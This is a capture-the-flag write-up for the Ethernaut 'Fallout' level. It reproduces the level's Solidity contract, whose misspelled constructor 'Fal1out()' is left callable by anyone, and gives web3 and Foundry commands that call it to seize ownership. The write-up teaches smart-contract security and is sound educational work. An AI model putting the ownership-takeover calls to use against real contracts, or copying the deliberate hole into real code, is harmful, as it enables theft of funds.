**Level 02 - Fallout (Ethernaut)**
==================================

**Overview**
------------

This level teaches about **constructor mistakes in Solidity**.

The contract has a small typo.

Because of this, a function becomes public.

**Objective:**

-   Become the owner of the contract


## **Ethernaut Info**

Problem statement
Claim ownership of the contract below to complete this level.

Things that might help

Solidity Remix IDE

**Contract**
------------

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```



**Vulnerability**
-----------------

The problem is a typo in the constructor.

```
function Fal1out() public payable
```

-   The contract name is Fallout

-   But function name is Fal1out (wrong)

So:

-   It is NOT a constructor

-   It is a normal public function

Anyone can call it and become owner 



**Attack Strategy**
-------------------

Inside this function:

```
owner = msg.sender;
```

So we only need to:

1.  Call Fal1out()

2.  Become owner



**Exploit Steps**
-----------------

### **Method 1 --- Browser Console (Web3)**

#### **1\. Call Fal1out**

```
await contract.Fal1out()
```



#### **2\. Check owner**

```
await contract.owner()
```

Now you are the owner.



### **Method 2 --- Foundry**

#### **1\. Call Fal1out**

```
cast send $CONTRACT "Fal1out()" --private-key $PRIVATE_KEY
```



#### **2\. Check owner**

```
cast call $CONTRACT "owner()(address)"
```



**Why This Works**
------------------

Old Solidity used constructor like this:

```
function ContractName() public
```

But here:

-   Name is wrong (Fal1out)

-   So it becomes public function

Anyone can call it and take ownership 



**Key Takeaways**
-----------------

-   Small typo can break security

-   Constructors must be correct

-   Never rely on old syntax

-   Always review function names carefully



**Tools**
---------

-   Browser console (web3)

-   Foundry (cast)

-   RPC provider



**Summary**
-----------

The contract has a wrong constructor name.

We:

-   call the function

-   become owner

This shows how small mistakes can break a contract.
